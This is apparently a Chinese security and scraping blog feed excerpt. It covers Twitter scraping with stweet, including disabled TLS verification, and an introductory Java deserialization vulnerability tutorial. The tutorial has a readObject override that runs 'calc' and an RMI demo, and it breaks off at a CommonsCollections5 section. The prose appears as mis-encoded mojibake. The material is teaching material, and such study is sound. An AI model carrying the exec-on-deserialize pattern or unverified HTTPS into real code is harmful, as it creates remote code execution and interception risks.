æ²¡æœ‰ç»™ä»£ç†é…ç½®çš„å…¥å£ï¼Œæ˜¾ç„¶è¿ä¸ä¸Š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl twittercrawler -a filename=myhashtags.csv -o mydata.csv</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> èƒ½å¤Ÿè‡ªå®šä¹‰çš„é…ç½®é¡¹å¤ªå°‘ï¼Œè€Œä¸”ä»…é’ˆå¯¹æ ‡ç­¾æœç´¢ï¼Œè·³è¿‡ã€‚</p></li></ol><h2 id="stweet"><a href="#stweet" class="headerlink" title="stweet"></a><a href="https://github.com/markowanga/stweet">stweet</a></h2><p>æ”¯æŒæ¨ç‰¹çš„é«˜çº§æœç´¢é€‰é¡¹ï¼ŒåŒæ—¶æ”¯æŒæ¨æ–‡å’Œç”¨æˆ·ä¿¡æ¯çš„çˆ¬å–ï¼Œstweet/docs/notebooks/ ç›®å½•ä¸‹æœ‰å„ç§ç¤ºä¾‹ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stweet</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æä¾›è®¸å¤šé…ç½®é¡¹ï¼Œéå¸¸å‹å¥½</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> arrow</span><br><span class="line"><span class="keyword">import</span> stweet <span class="keyword">as</span> st</span><br><span class="line"></span><br><span class="line">ProxyConfig = st.RequestsWebClientProxyConfig(</span><br><span class="line">    http_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>,</span><br><span class="line">    https_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">since = arrow.get(<span class="string">&#x27;2021-10-01&#x27;</span>)</span><br><span class="line">until = arrow.get(<span class="string">&#x27;2021-10-02&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_tweets_task = st.SearchTweetsTask(</span><br><span class="line">    exact_words=<span class="string">&quot;nijisanji&quot;</span>,</span><br><span class="line">    since=since,</span><br><span class="line">    until=until,</span><br><span class="line">    replies_filter=st.RepliesFilter.ONLY_ORIGINAL,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">st.TweetSearchRunner(</span><br><span class="line">    search_tweets_task=search_tweets_task,</span><br><span class="line">    tweet_outputs=[st.CsvTweetOutput(<span class="string">&#x27;nijisanji_20211001_20211002.csv&#x27;</span>), st.PrintTweetOutput()],</span><br><span class="line">    web_client=st.RequestsWebClient(proxy=ProxyConfig, verify=<span class="literal">False</span>),</span><br><span class="line">).run()</span><br></pre></td></tr></table></figure><p> ä¸ç¢äº‹å„¿çš„è­¦å‘Š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;127.0.0.1&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">warnings.warn(</span><br></pre></td></tr></table></figure><p> æ·»åŠ ä»¥ä¸‹è¯­å¥å…³é—­</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure><p> çˆ¬å¾—éå¸¸å¿«ï¼Œå­—æ®µä¹Ÿæ¯” scweet æ”¶é›†çš„å¤šï¼Œä½†æ˜¯åªæœ‰ 2021.10.02 çš„æ•°æ®ï¼Œéš¾é“æ—¶é—´èŒƒå›´æ˜¯å·¦å¼€å³é—­çš„ã€‚å¤šè¯•å‡ æ¬¡å‘ç°çˆ¬å¤ªå¿«äº†æç¤º <code>è¿œç¨‹ä¸»æœºå¼ºè¿«å…³é—­äº†ä¸€ä¸ªç°æœ‰çš„è¿æ¥</code>ï¼Œè€Œä¸”æ¯æ¬¡çˆ¬å–çš„ç»“æœéƒ½ä¸ä¸€æ ·â€¦</p> <img src="https://i.loli.net/2021/10/11/cXw9h8bOK1EAYjQ.png"></li></ol><ol start="3"><li><p>æ€»ç»“</p><p> è™½ç„¶èƒ½ç”¨ä½†æœ‰ç‚¹é—®é¢˜ï¼Œä½œè€…æ­£åœ¨å‡†å¤‡ stweet 2.0ï¼Œç­‰æ¨å‡ºä¹‹åå†è¿›è¡Œå°è¯•ã€‚</p></li><li><p>æ›´æ–°</p><p> 2021.10.14 æ›´æ–° stweet 2.0ï¼Œè¯´æ˜æ–‡æ¡£è¿˜ä¸å¤Ÿå®Œå–„ï¼Œå¦‚ä½•ä½¿ç”¨çš„ä¾‹å­ä¹Ÿæ²¡æœ‰ã€‚<br> 2021.10.15 æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥çˆ¬å–æ¨æ–‡æ•°æ®å’Œç”¨æˆ·æ•°æ®å¦ï¼Œä½†æ˜¯ç°åœ¨åªæ”¯æŒä¿å­˜ JSON æ ¼å¼çš„æ–‡ä»¶ï¼ˆå› ä¸ºæ²¡å†™è§£æï¼‰ï¼Œé‡å¤çˆ¬å–äº†å‡ æ¬¡ä»æ–‡ä»¶å¤§å°ä¸Šçœ‹éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥åº”è¯¥æ²¡é—®é¢˜äº†ã€‚å¯ä»¥å†ç­‰ç­‰å®Œå–„ã€‚</p></li></ol><h2 id="Web-Scraping-Tweet-Traffic"><a href="#Web-Scraping-Tweet-Traffic" class="headerlink" title="Web_Scraping_Tweet_Traffic"></a><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></h2><p>é…åˆæ–‡ç« é£Ÿç”¨ï¼š</p><ul><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-1-b3e2db29051d">Web Scrape Twitter by Python Selenium (Part 1)</a></li><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-2-c22ae3e78e03">Web Scrape Twitter by Python Selenium (Part 2)</a></li></ul><p>è¯¥ä»“åº“å·²äº 2019 å¹´åœæ›´ï¼Œå¯ä½œä¸ºçˆ¬å–æ€è·¯çš„å­¦ä¹ ææ–™ã€‚</p><h1 id="åœ¨çº¿çˆ¬å–"><a href="#åœ¨çº¿çˆ¬å–" class="headerlink" title="åœ¨çº¿çˆ¬å–"></a>åœ¨çº¿çˆ¬å–</h1><p><a href="https://www.vicinitas.io/free-tools/download-search-tweets">https://www.vicinitas.io/free-tools/download-search-tweets</a> ï¼Œéœ€è¦æ¨ç‰¹è´¦æˆ·ç™»é™†åçˆ¬å–ï¼Œå¯ä»¥ä¸€è¯•ã€‚</p><img src="https://i.loli.net/2021/10/11/ckCoM9PsF18huad.jpg">]]></content>
    
    
    <summary type="html">æŒ‚ä¸ªä»£ç†ç›´æ¥çˆ¬å–</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java ååºåˆ—åŒ–æ¼æ´å…¥é—¨</title>
    <link href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</id>
    <published>2021-09-16T03:41:30.000Z</published>
    <updated>2021-12-20T11:16:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-ååºåˆ—åŒ–æ¼æ´"><a href="#Java-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Java ååºåˆ—åŒ–æ¼æ´"></a>Java ååºåˆ—åŒ–æ¼æ´</h1><div class="note info flat"><p>åˆ©ç”¨æ–¹æ³•å¤šã€é€ æˆå±å®³æœ‰å¤§æœ‰å°ï¼›æ²¡æœ‰æ•ˆæœå¾ˆå¥½çš„æ£€æµ‹å·¥å…·ï¼Œé€šå¸¸æ˜¯æœ‰ç»éªŒçš„ä»ä¸šäººå‘˜å‘ç°ã€‚</p></div><p>åºåˆ—åŒ–ï¼šæŠŠ Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­ï¼ŒObjectOutputStream ç±»çš„ <code>writeObject()</code> æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚</p><p>ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸º Java å¯¹è±¡çš„è¿‡ç¨‹ï¼ŒObjectInputStream ç±»çš„ <code>readObject()</code> æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚</p><p>æ¼æ´æˆå› ï¼šæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œæ„é€ çš„æ¶æ„ä»£ç ã€‚</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="é‡å†™-readObject-æ–¹æ³•"><a href="#é‡å†™-readObject-æ–¹æ³•" class="headerlink" title="é‡å†™ readObject æ–¹æ³•"></a>é‡å†™ readObject æ–¹æ³•</h3><p>é»˜è®¤çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ“ä½œï¼Œå®ç°çš„æ•ˆæœå°±æ˜¯å†™å…¥æ–‡ä»¶å’Œä»æ–‡ä»¶ä¸­è¯»å–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ obj å¯¹è±¡</span></span><br><span class="line">        String obj = <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ä¿¡æ¯çš„ object æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() æ–¹æ³•å°† obj å¯¹è±¡å†™å…¥ object æ–‡ä»¶</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ– obj å¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/test/object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ¢å¤å¯¹è±¡</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ object æ–‡ä»¶ä¸­çš„å†…å®¹ï¼ˆåºåˆ—åŒ–çš„ objï¼‰</p><ul><li><code>0xaced</code> ä¸º Java å¯¹è±¡åºåˆ—åŒ–æµçš„é­”æ•°ï¼Œ<code>0x0005</code> ä¸º Java å¯¹è±¡åºåˆ—åŒ–çš„ç‰ˆæœ¬å·ï¼ŒJava å¯¹è±¡åºåˆ—åŒ–æ•°æ®çš„å‰ 4 ä¸ªå­—èŠ‚ä¸º <code>AC ED 00 05</code></li></ul><img src="https://i.loli.net/2021/09/16/OD7GcKlSnPauLI4.png" ><p>é‡å†™ readObject å‡½æ•°ï¼Œåœ¨å…¶ä¸­è°ƒç”¨è®¡ç®—å™¨</p><ul><li>åªæœ‰å®ç° Serializable æ¥å£çš„ç±»çš„å¯¹è±¡æ‰å¯ä»¥è¢«åºåˆ—åŒ–</li><li>é‡å†™äº† <code>readObject()</code> å‡½æ•°</li><li>é»˜è®¤çš„å†™æ–¹æ³• <code>writeObject()</code> å¯ä»¥å°†éé™æ€å’Œé transient çš„å­—æ®µåºåˆ—åŒ–<ul><li>ç®€å•çš„å¯¹è±¡åºåˆ—åŒ–æ“ä½œç”¨é»˜è®¤æ–¹æ³•å³å¯</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ myObj å¯¹è±¡</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„ myobject æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() æ–¹æ³•å°† myObj å¯¹è±¡å†™å…¥ myobject æ–‡ä»¶</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ– obj å¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/test/myobject&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ¢å¤å¯¹è±¡</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é‡å†™ readObject() æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰§è¡Œé»˜è®¤çš„ readObject() æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºå‘½ä»¤</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè¯¥ç¨‹åºï¼Œåœ¨æ§åˆ¶å°è¾“å‡º <code>hi</code> å¹¶å¼¹å‡ºè®¡ç®—å™¨</p><img src="https://i.loli.net/2021/09/16/wFJmiW5eLQcaOkv.jpg"><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMIï¼ˆRemote Method Invocationï¼‰ï¼šä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå¸¸è§çš„ä¸¤ç§æ¥å£å®ç°ä¸º JRMPï¼ˆJava Remote Message Protocol ï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰ä»¥åŠ CORBAã€‚</p><img src="https://i.loli.net/2021/09/16/5uDiW4J7vPRMHAX.png" ><p>ç®€å•ç†è§£ï¼šæœåŠ¡å™¨å°†æä¾›çš„æœåŠ¡å¯¹è±¡æ³¨å†Œåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå®¢æˆ·ç«¯æŸ¥è¯¢æ³¨å†Œè¡¨è·å¾—å¯¹è±¡å¹¶è°ƒç”¨</p><ol><li>æœåŠ¡ç«¯ Server.java åˆ›å»ºæ³¨å†Œè¡¨ï¼Œæ³¨å†ŒæœåŠ¡å¯¹è±¡ <code>hello</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ç”Ÿæˆå­˜æ ¹ï¼ˆStubï¼‰</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello,<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºæœ¬æœº 1099 ç«¯å£ä¸Šçš„ RMI registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å¯¹è±¡ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>è¿œç¨‹æ¥å£å®šä¹‰åŠå®ç°</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.java</span></span><br><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl</span></span><br><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>å®¢æˆ·ç«¯ Client.java è°ƒç”¨è¿œç¨‹å¯¹è±¡</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// è·å–è¿œç¨‹ä¸»æœºä¸Šçš„æ³¨å†Œè¡¨</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·å–è¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        Hello hello = (Hello)registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner( System.in ); <span class="comment">// è¯»å–è¾“å…¥</span></span><br><span class="line">            String message = sc.next();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span>(message.equals(<span class="string">&quot;quit&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œ Server æä¾› Hello æœåŠ¡ï¼Œè¿è¡Œ Client æŸ¥è¯¢ hello è¿œç¨‹æœåŠ¡å¯¹è±¡ï¼Œè¯»å–æ§åˆ¶å°è¿è¡Œå¹¶è°ƒç”¨ã€‚</p><img src="https://i.loli.net/2021/09/16/eJc36u7bRKvmaSE.jpg" ><img src="https://i.loli.net/2021/09/16/cf2Qm6FZzPjOKax.jpg" ><h3 id="RMI-ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰"><a href="#RMI-ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰" class="headerlink" title="RMI ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰"></a>RMI ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰</h3><blockquote><p> åˆ©ç”¨äº† CommonsCollections5<br> jdk1.8 ä¹‹åå¯¹ AnnotationInvocationHandler ç±»åšäº†é™åˆ¶ï¼Œæ‰€ä»¥åœ¨ jdk1.8 ç‰ˆæœ¬å°±æ‹¿ BadAttributeValueExpException è¿›è¡Œæ›¿ä»£</p></blockquote><p>æ¼æ´æˆå› ï¼šRMI åœ¨ä¼ è¾“æ•°æ®çš„æ—¶å€™ï¼Œä¼šå°†æ•°æ®åºåˆ—åŒ–ï¼Œåœ¨ä¼ 